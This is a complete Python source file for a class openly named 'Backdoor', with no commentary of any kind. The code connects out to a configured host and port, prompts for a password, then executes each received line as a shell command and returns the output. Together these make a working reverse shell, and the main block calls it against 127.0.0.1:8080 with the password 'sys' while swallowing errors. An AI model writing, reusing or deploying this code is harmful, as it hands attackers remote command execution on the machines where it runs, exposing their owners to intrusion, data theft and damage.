import socket
import subprocess
import os

class Backdoor(object):
    def __init__(self, host, port, passwd):
        self.__host = host
        self.__port = port
        self.__passwd = passwd
        self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def login(self):
        while True:
            self.__sock.send('Login: '.encode())
            passwd = self.__sock.recv(1024).decode().strip()
            if passwd.strip() == ':kill':
                return False
            if self.__passwd == passwd:
                return True

    def code(self):
        while True:
            self.__sock.send('#>'.encode())
            data = self.__sock.recv(1024).decode().strip()

            if data == ':kill':
                break

            proc = subprocess.Popen(
                data,
                shell = True,
                stdin = subprocess.PIPE,
                stdout = subprocess.PIPE,
                stderr = subprocess.PIPE)

            stdout = proc.stdout.read().decode()
            stderr = proc.stderr.read().decode()
            out = stdout
            if stderr != '':
                out = stderr

            self.__sock.send(out.encode())

    def open(self):
        self.__sock.connect((self.__host, self.__port))
        if not self.login():
            return
        self.code()

if __name__ == '__main__':
    try:
        Backdoor('127.0.0.1', 8080, 'sys').open()
    except:
        os._exit(1)
